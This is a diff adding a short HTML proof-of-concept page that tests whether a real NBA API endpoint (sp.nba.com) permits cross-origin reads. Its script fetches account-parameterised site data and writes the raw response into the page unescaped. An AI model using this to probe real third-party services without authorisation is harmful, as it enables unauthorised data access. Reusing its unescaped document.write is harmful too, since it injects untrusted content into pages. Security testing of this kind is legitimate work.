@@ -1,0 +1,17 @@
+<html>
+<head>
+    <title>Test CORS Vulnerability</title>
+</head>
+<body>
+    <h1>Testing CORS Vulnerability</h1>
+    <script>
+        fetch('https://sp.nba.com/get_site_data?account_id=113&href=https%3A%2F%2Fwww.nba.com%2Ffuture-starts-now&requestUUID=a6c3e67f-fbe8-4b07-9db7-7646aeedff16-1728595764097')
+        .then(response => response.text())
+        .then(data => {
+            console.log('Response from NBA API:', data);
+            document.write('<pre>' + data + '</pre>');
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
